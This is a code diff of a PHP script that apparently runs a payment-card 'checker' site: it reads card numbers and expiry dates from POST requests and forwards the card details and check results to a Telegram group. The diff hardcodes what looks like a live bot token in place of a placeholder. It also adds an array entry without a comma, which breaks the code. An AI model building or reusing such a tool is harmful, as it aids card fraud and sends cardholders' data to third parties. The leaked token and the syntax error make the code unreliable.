@@ -80,7 +80,7 @@ function formatResponse($response) {
 // Function to send Telegram notification
 function sendTelegramNotification($card_details, $status, $response) {
     // Load Telegram Bot Token from environment (secure storage)
-    $bot_token = getenv('TELEGRAM_BOT_TOKEN') ?: 'YOUR_BOT_TOKEN_HERE'; // Replace with actual token in env
+    $bot_token = getenv('TELEGRAM_BOT_TOKEN') ?: '8421537809:AAEfYzNtCmDviAMZXzxYt6juHbzaZGzZb6A'; // Replace with actual token in env
     $chat_id = '-1003204998888'; // Your group chat ID
     $group_link = 'https://t.me/+zkYtLxcu7QYxODg1';
     $site_link = 'https://cxchk.site';
@@ -114,6 +114,7 @@ function sendTelegramNotification($card_details, $status, $response) {
         'chat_id' => $chat_id,
         'text' => $message,
         'parse_mode' => 'HTML'
+        'disable_web_page_preview' => true
     ];
 
     $ch = curl_init($telegram_url);
@@ -131,6 +132,7 @@ function sendTelegramNotification($card_details, $status, $response) {
         log_message("Telegram notification sent for $card_details: $status [$formatted_response]");
     }
 }
+
 // Get card details from POST request
  $cardNumber = $_POST['card']['number'] ?? '';
  $expMonth = $_POST['card']['exp_month'] ?? '';
